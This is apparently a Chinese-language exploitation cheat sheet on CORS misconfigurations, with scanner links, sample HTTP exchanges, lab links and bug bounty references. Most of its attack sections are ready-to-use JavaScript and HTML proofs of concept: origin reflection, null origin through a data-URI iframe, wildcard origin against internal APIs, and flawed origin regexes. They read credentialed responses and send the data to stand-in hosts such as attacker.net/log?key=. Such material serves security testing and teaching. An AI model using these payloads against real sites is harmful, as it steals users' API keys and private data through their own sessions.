# CORS 配置错误

> 某个API域存在全站CORS配置错误。这允许攻击者利用用户的凭据发起跨域请求，因为应用程序没有正确设置Origin头白名单，并且设置了`Access-Control-Allow-Credentials: true`，这意味着我们可以从攻击者的网站使用受害者的凭据发起请求。

## 目录

* [工具](#工具)
* [前置条件](#前置条件)
* [方法学](#方法学)
    * [Origin反射](#origin反射)
    * [Null Origin](#null-origin)
    * [受信任源的XSS](#受信任源的xss)
    * [无凭据的通配符Origin](#无凭据的通配符origin)
    * [扩展Origin](#扩展origin)
* [实验环境](#实验环境)
* [参考资料](#参考资料)

## 工具

* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS配置错误扫描器
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - 快速的CORS配置错误漏洞扫描器
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC生成器
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - 利用内部网络中的CORS配置错误
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - 快速的CORS配置错误发现工具

## 前置条件

* BURP HEADER> `Origin: https://evil.com`
* VICTIM HEADER> `Access-Control-Allow-Credential: true`
* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` 或 `Access-Control-Allow-Origin: null`

## 方法学

通常您需要针对API端点进行测试。使用以下有效负载来利用目标`https://victim.example.com/endpoint`上的CORS配置错误。

### Origin反射

#### 易受攻击的实现

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### 概念验证

此PoC要求相应的JS脚本托管在`evil.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

或

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### Null Origin

#### 易受攻击的实现

服务器可能不会完全反射`Origin`头，但可能允许`null` origin。服务器响应可能如下所示：

```ps1
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### 概念验证

可以通过将攻击代码放入使用data URI方案的iframe中来利用此漏洞。如果使用data URI方案，浏览器将在请求中使用`null` origin：

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

### 受信任源的XSS

如果应用程序确实实现了严格的白名单机制，上述利用代码将不起作用。但如果您在受信任的源上发现XSS漏洞，可以注入上述利用代码来利用CORS。

```ps1
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

### 无凭据的通配符Origin

如果服务器响应通配符origin `*`，**浏览器将永远不会发送cookies**。但是，如果服务器不需要身份验证，仍然可以访问服务器上的数据。这种情况可能发生在无法从互联网访问的内部服务器上。攻击者的网站可以渗透到内部网络，无需身份验证即可访问服务器的数据。

```powershell
* 是唯一的通配符origin
https://*.example.com 是无效的
```

#### 易受攻击的实现

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

#### 概念验证

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

### 扩展Origin

有时，原始origin的某些扩展没有被服务器端过滤。这可能是由于使用了实现不佳的正则表达式来验证origin头。

#### 易受攻击的实现（示例1）

在这种情况下，插入到`example.com`前面的任何前缀都将被服务器接受。

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### 概念验证（示例1）

此PoC要求相应的JS脚本托管在`evilexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

#### 易受攻击的实现（示例2）

在这种情况下，服务器使用的正则表达式中点号没有正确转义。例如，使用了`^api.example.com$`而不是`^api\.example\.com$`。因此，点号可以用任何字母替换，从而允许从第三方域访问。

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### 概念验证（示例2）

此PoC要求相应的JS脚本托管在`apiiexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

## 实验环境

* [PortSwigger - 基础origin反射攻击的CORS漏洞](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
* [PortSwigger - 信任null origin的CORS漏洞](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
* [PortSwigger - 信任不安全协议的CORS漏洞](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
* [PortSwigger - 内部网络渗透攻击的CORS漏洞](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)

## 参考资料

* [[██████] 跨域资源共享配置错误(CORS) - Vadim (jarvis7) - 2018年12月20日](https://hackerone.com/reports/470298)
* [高级CORS利用技术 - Corben Leo - 2018年6月16日](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
* [CORS配置错误 | 账户接管 - Rohan (nahoragg) - 2018年10月20日](https://hackerone.com/reports/426147)
* [CORS配置错误导致私有信息泄露 - sandh0t (sandh0t) - 2018年10月29日](https://hackerone.com/reports/430249)
* [www.zomato.com上的CORS配置错误 - James Kettle (albinowax) - 2016年9月15日](https://hackerone.com/reports/168574)
* [CORS配置错误详解 - Detectify博客 - 2018年4月26日](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
* [跨域资源共享(CORS) - PortSwigger Web安全学院 - 2019年12月30日](https://portswigger.net/web-security/cors)
* [跨域资源共享配置错误 | 窃取用户信息 - bughunterboy (bughunterboy) - 2017年6月1日](https://hackerone.com/reports/235200)
* [利用CORS配置错误获取比特币和漏洞赏金 - James Kettle - 2016年10月14日](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [利用错误配置的CORS(跨域资源共享) - Geekboy - 2016年12月16日](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
* [超越范围思考：高级CORS利用技术 - Ayoub Safa (Sandh0t) - 2019年5月14日](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
